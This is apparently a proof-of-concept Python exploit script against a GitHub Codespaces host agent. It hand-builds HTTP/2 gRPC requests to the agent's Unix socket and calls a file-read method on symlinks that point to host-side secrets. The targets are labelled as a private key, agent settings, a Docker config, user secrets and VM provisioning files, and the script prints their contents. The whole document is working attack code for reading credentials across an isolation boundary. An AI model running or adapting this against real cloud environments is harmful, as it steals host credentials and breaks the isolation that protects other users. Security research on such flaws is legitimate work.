import socket
import struct
import sys
import os
import base64

SOCK_PATH = "/workspaces/.codespaces/shared/cs-agent.sock"
SERVICE = "Codespaces.Grpc.CodespaceHostService.V1.CodespaceHost"
METHOD = "GetFileContentAsync"

def encode_grpc_message(data):
    return b'\x00' + struct.pack('>I', len(data)) + data

def encode_protobuf_string(field_number, value):
    tag = (field_number << 3) | 2
    encoded_value = value.encode('utf-8')
    length = len(encoded_value)
    result = b''
    while tag > 0x7f:
        result += bytes([tag & 0x7f | 0x80])
        tag >>= 7
    result += bytes([tag])
    while length > 0x7f:
        result += bytes([length & 0x7f | 0x80])
        length >>= 7
    result += bytes([length])
    result += encoded_value
    return result

def build_http2_request(path, grpc_msg):
    preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    settings_frame = b'\x00\x00\x00\x04\x00\x00\x00\x00\x00'
    
    headers = b''
    headers += b'\x82'  # :method POST
    headers += b'\x86'  # :scheme http
    headers += b'\x84'  # :path (will override)
    
    path_bytes = path.encode()
    headers += b'\x00' + bytes([len(b':path')]) + b':path' + bytes([len(path_bytes)]) + path_bytes
    headers += b'\x00' + bytes([len(b'content-type')]) + b'content-type' + bytes([len(b'application/grpc')]) + b'application/grpc'
    headers += b'\x00' + bytes([len(b'te')]) + b'te' + bytes([len(b'trailers')]) + b'trailers'
    headers += b'\x00' + bytes([len(b'authorization')]) + b'authorization' + bytes([len(b'Bearer x')]) + b'Bearer x'
    
    headers_frame = struct.pack('>I', len(headers))[1:] + b'\x01\x04' + b'\x00\x00\x00\x01' + headers
    data_frame = struct.pack('>I', len(grpc_msg))[1:] + b'\x00\x01' + b'\x00\x00\x00\x01' + grpc_msg
    
    return preface + settings_frame + headers_frame + data_frame

def read_file_via_grpc(filepath):
    path = f"/{SERVICE}/{METHOD}"
    protobuf_msg = encode_protobuf_string(1, filepath)
    grpc_msg = encode_grpc_message(protobuf_msg)
    request = build_http2_request(path, grpc_msg)
    
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect(SOCK_PATH)
        sock.sendall(request)
        
        response = b''
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        # Extract content from response - look for gRPC message frames
        idx = 0
        while idx < len(response):
            # Look for gRPC length-prefixed message (0x00 + 4 byte length)
            if idx + 5 <= len(response) and response[idx] == 0:
                msg_len = struct.unpack('>I', response[idx+1:idx+5])[0]
                if idx + 5 + msg_len <= len(response) and msg_len > 0:
                    msg = response[idx+5:idx+5+msg_len]
                    # The protobuf response has field 1 = bytes content
                    if len(msg) > 2 and msg[0] == 0x0a:  # field 1, wire type 2
                        content_len_start = 1
                        content_len = 0
                        shift = 0
                        while content_len_start < len(msg):
                            b = msg[content_len_start]
                            content_len |= (b & 0x7f) << shift
                            content_len_start += 1
                            shift += 7
                            if not (b & 0x80):
                                break
                        content = msg[content_len_start:content_len_start+content_len]
                        return content
            idx += 1
        
        # Check for gRPC error
        resp_str = response.decode('utf-8', errors='replace')
        if 'grpc-status' in resp_str:
            for line in resp_str.split('\n'):
                if 'grpc-status' in line or 'grpc-message' in line:
                    print(f"  gRPC: {line.strip()}", file=sys.stderr)
        return None
    finally:
        sock.close()

files = [
    ("/workspaces/probe-x/.symlinks/transport_priv", "CRP Private Key"),
    ("/workspaces/probe-x/.symlinks/appsettings", "VSOAgent appsettings.json"),
    ("/workspaces/probe-x/.symlinks/docker_config", "HOST Docker config.json"),
    ("/workspaces/probe-x/.symlinks/vm_init_settings", "vm_init.0.settings"),
    ("/workspaces/probe-x/.symlinks/user_secrets", "HOST .user-secrets.json"),
    ("/workspaces/probe-x/.symlinks/goalstate", "GoalState XML"),
    ("/workspaces/probe-x/.symlinks/vm_artifacts", "InVMArtifacts Profile"),
]

for fpath, label in files:
    print(f"\n{'='*60}")
    print(f"[{label}] via symlink: {fpath}")
    print('='*60)
    content = read_file_via_grpc(fpath)
    if content:
        try:
            text = content.decode('utf-8')
            # Truncate very long content but show first/last parts
            if len(text) > 4000:
                print(text[:2000])
                print(f"\n... [{len(text)} total bytes, showing first 2000 + last 1000] ...\n")
                print(text[-1000:])
            else:
                print(text)
        except:
            print(f"[Binary content, {len(content)} bytes]")
            print(f"Base64 (first 500 chars): {base64.b64encode(content).decode()[:500]}")
    else:
        print("[FAILED or empty response]")
